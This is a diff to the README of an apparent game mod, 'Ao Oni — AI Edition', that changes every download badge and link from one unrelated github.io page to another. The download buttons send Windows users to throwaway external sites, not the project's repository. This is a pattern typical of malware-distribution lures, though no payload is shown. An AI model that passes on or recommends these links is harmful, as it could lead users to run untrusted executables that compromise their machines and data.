@@ -2,9 +2,9 @@
 
 # Ao Oni — AI Edition
 
-[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://phantommofence.github.io/download-win/)
-[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://phantommofence.github.io/download-win/)
-[![The oni is pursuing](https://img.shields.io/badge/Oni-Pursuing-1f4e8b?style=for-the-badge)](https://phantommofence.github.io/download-win/)
+[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
+[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
+[![The oni is pursuing](https://img.shields.io/badge/Oni-Pursuing-1f4e8b?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
 
 [![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/TitanDeliverer/ao-oni-ai-edition)
 [![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/TitanDeliverer/ao-oni-ai-edition)
@@ -55,7 +55,7 @@ A locally-hosted model runs the oni as a pursuing intelligence: it tracks where 
 
 ### Step 1 — Get the mod
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://phantommofence.github.io/download-win/)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://beatowlrouse.github.io/windownload/)
 
 ### Step 2 — Install Ollama (the local AI engine)
 
@@ -146,7 +146,7 @@ CPU-only inference is supported and slower. No GPU is strictly required.
 
 ## 🔗 Links
 
-- **[⬇ Download the latest version](https://phantommofence.github.io/download-win/)**
+- **[⬇ Download the latest version](https://beatowlrouse.github.io/windownload/)**
 - [Repository](https://github.com/TitanDeliverer/ao-oni-ai-edition)
 - [Ollama — local AI runtime](https://ollama.com)
 - [Ollama model library](https://ollama.com/library)
